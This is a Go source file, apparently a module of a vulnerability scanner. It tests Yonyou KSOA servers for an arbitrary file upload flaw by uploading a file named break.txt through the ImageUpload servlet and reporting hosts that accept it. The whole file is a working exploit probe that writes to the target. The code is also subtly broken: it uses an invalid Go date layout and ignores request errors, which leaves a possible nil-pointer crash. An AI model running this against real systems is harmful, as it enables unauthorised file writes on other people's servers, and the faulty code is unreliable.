package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func ImageUploadScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	ImageUpload := "用友 时空KSOA com.sksoft.bill.ImageUpload 任意文件上传漏洞"
	urls := address + "/servlet/com.sksoft.bill.ImageUpload?filename=break.txt&filepath=/"
	response, _ := client.Post(urls, "text/plain", strings.NewReader("123"))
	defer response.Body.Close()
	// 读取响应内容
	body11, _ := ioutil.ReadAll(response.Body)

	if response.StatusCode != http.StatusFound && strings.Contains(string(body11), "break") {
		result22 := ImageUpload + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result22, filename) // 保存结果到文本文件
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, ImageUpload, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, ImageUpload)
		fmt.Println(output)
	}
}
